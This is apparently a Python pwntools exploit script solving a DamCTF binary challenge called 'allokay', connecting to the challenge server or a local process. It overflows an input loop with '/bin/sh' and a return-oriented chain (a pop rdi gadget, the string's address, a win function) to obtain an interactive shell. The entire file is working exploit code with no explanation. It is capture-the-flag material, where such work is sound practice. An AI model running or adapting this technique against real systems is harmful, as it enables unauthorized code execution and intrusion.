from pwn import *

elf = context.binary = ELF('./allokay')
host = args.HOST or 'chals.damctf.xyz'
port = int(args.PORT or 32575)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
        #return gdb.debug([elf.path] + argv, env={"LD_PRELOAD": libc.path}, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)
        #return process([ld.path, elf.path] + argv, env={"LD_PRELOAD": libc.path}, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b main
b *0x4007ff
continue
'''.format(**locals())

# -- Exploit goes here --

p = start()

p.recvuntil('How many favorite numbers do you have?\n')

p.sendline('100/bin/sh\x00')

for i in range(23):
    p.sendline('-')

# pop rdi; ret
POP_RDI = 0x0000000000400933
p.sendline(str(POP_RDI))

# buffer
binsh = 0x6010a0 + 3
p.sendline(str(binsh))

# win
win = 0x0000000000400767
p.sendline(str(win))


for i in range(74):
    p.sendline('-')

p.interactive()